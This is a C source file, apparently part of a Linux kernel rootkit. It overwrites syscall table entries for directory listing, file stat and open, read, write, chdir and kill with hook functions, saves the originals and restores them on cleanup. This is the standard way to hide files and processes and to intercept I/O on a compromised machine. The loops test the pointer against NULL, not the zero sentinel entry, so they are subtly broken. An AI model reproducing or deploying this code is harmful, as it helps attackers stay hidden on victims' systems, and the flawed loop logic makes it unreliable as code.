#include "inc/hook.h"
#include "inc/util.h"

struct hook {
  uint16_t num;    // syscall number (nr, rax)
  char *name;      // syscall name (only used for debugging)
  syscall_t *func; // hook function
  syscall_t *orig; // original function
};

struct hook hooks[] = {
    {.num = __NR_newfstatat, .name = "newfstatat", .func = h_newfstatat},
    {.num = __NR_getdents64, .name = "getdents64", .func = h_getdents64},
    {.num = __NR_getdents, .name = "getdents", .func = h_getdents},
    {.num = __NR_openat, .name = "openat", .func = h_openat},
    {.num = __NR_statx, .name = "statx", .func = h_statx},
    {.num = __NR_chdir, .name = "chdir", .func = h_chdir},
    {.num = __NR_write, .name = "write", .func = h_write},
    {.num = __NR_kill, .name = "kill", .func = h_kill},
    {.num = __NR_read, .name = "read", .func = h_read},
    0,
};

bool hooks_setup(uint64_t *systable) {
  struct hook *h = hooks;

  for (; NULL != h; h++) {
    h->orig = (void *)systable[h->num];   // save the old syscall
    systable[h->num] = (uint64_t)h->func; // replace it with the hooked call
    debgf("%s: 0x%p -> 0x%p", h->name, h->orig, h->func);
  }

  return true;
}

bool hooks_clean(uint64_t *systable) {
  struct hook *h = hooks;

  for (; NULL != h; h++) {
    systable[h->num] = (uint64_t)h->orig; // load the old syscall back again
    debgf("%s: 0x%p -> 0x%p", h->name, h->func, h->orig);
  }

  return true;
}

syscall_t *hooks_find_orig(uint16_t num) {
  struct hook *h = hooks;

  for (; NULL != h; h++)
    if (h->num == num)
      return h->orig;

  return NULL;
}
